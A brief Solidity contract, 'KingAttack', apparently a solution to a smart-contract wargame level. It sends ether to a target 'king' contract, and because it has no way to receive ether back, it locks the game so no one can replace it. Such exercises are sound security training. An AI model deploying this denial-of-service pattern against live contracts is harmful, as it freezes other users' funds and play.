// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract KingAttack {
  function call(address payable _kingContract) public payable returns(bool) {
    (bool success, ) = _kingContract.call{value: msg.value}("");

    return success;
  }
}